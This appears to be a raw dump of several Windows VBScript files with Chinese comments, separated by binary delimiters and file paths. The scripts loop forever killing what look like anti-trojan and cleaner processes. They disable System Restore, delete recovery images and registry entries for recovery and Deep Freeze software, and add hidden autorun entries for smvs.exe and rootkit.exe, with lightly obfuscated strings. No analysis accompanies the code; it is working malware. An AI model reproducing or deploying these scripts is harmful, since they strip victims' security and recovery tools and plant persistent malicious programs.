on error resume next

do while true
     for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_  '循环进程 
  if ps.name="Trojanwall.exe" or ps.name="FygTCleaner.exe" or ps.name="TPFW.exe"    then  '关闭QQ,也可以改成其它的程序
                 ps.terminate
           end if
     next 
     wscript.sleep 1
loop |~.瑋0|~.#|C:\WINDOWS\hy.vbs|~.瑋on error resume next

strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\default") 
Set objItem = objWMIService.Get("SystemRestore") 
errResults = objItem.Disable("") 


Set fso = Wscript.CreateObject("Scripting.FileSystemObject")
fso.deletefile("C:\yjhy\grub\memdisk.gz")


fso.deletefile("C:\yjhy\dos.img")
Wscript.quit|~.瑋0|~.#|C:\WINDOWS\tzdz.vbs|~.瑋on error resume next

Dim WSHShell 
Set WSHShell=WScript.CreateObject("WScript.Shell")  

WSHShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\TPFW"

WSHShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Windows木马防火墙" 

WSHShell.RegDelete "HKLM\SOFTWARE\GoldenSoft\Recovery Genius\InstallPath"

WSHShell.RegDelete "HKLM\SOFTWARE\GoldenSoft\Recovery Genius\LinkPath"


WSHShell.RegDelete "HKLM\SYSTEM\CurrentControlSet\Services\DFServEx\ImagePath"

WSHShell.RegDelete "HKLM\SYSTEM\CurrentControlSet\Services\DFServEx\LocalSystem"



|~.瑋0|~.#|C:\WINDOWS\zjqd.vbs|~.瑋on error resume next

regruns()
Sub regruns()
On Error Resume Next
set a=createobject("wsc"&"ript.shell")
a.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\smvs1", dir1&"C:\windows\system32\smvs.exe"
a.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\yingcang1", dir1&"C:\WINDOWS\rootkit.exe"
End sub
